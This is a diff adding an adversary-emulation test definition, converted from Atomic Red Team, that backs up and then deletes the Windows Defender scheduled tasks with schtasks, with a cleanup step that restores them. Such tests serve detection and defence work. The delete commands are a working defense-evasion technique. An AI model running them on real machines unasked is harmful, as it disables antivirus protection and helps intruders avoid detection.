@@ -1,0 +1,58 @@
+# Converted from Atomic Red Team - Impair Defenses: Disable or Modify Tools
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1562.001
+# Original auto_generated_guid: 4b841aa1-0d05-4b32-bbe7-7564346e7c76
+
+---
+api_version: 2.0
+uuid: ff98c879-8748-491a-a7a5-1f1156f7d605
+name: Delete Windows Defender Scheduled Tasks
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  The following atomic test will delete the Windows Defender scheduled tasks.
+
+  Reference: https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/
+
+mitre:
+  tactics:
+    - "TA0005 Defense Evasion"
+  techniques:
+    - "T1562 Impair Defenses"
+  subtechniques:
+    - "T1562.001 Disable or Modify Tools"
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: true
+
+args:
+  - name: backup_path
+    description: Path to store the backup of the scheduled tasks
+    type: path
+    default: "C:\\Users\\Public"
+
+steps:
+  - name: backup_scheduled_tasks
+    executor: cmd.exe
+    inline: |
+      schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" > "{{.Args.backup_path}}\Windows_Defender_Scheduled_Scan.xml"
+      schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" > "{{.Args.backup_path}}\Windows_Defender_Cleanup.xml"
+      schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" > "{{.Args.backup_path}}\Windows_Defender_Verification.xml"
+      schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" > "{{.Args.backup_path}}\Windows_Defender_Cache_Maintenance.xml"
+
+  - name: delete_scheduled_tasks
+    executor: cmd.exe
+    inline: |
+      IF EXIST "{{.Args.backup_path}}\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f )
+      IF EXIST "{{.Args.backup_path}}\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f )
+      IF EXIST "{{.Args.backup_path}}\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f )
+      IF EXIST "{{.Args.backup_path}}\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f )
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        schtasks /create /xml "{{.Args.backup_path}}\Windows_Defender_Scheduled_Scan.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f
+        schtasks /create /xml "{{.Args.backup_path}}\Windows_Defender_Cleanup.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f
+        schtasks /create /xml "{{.Args.backup_path}}\Windows_Defender_Verification.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f
+        schtasks /create /xml "{{.Args.backup_path}}\Windows_Defender_Cache_Maintenance.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f
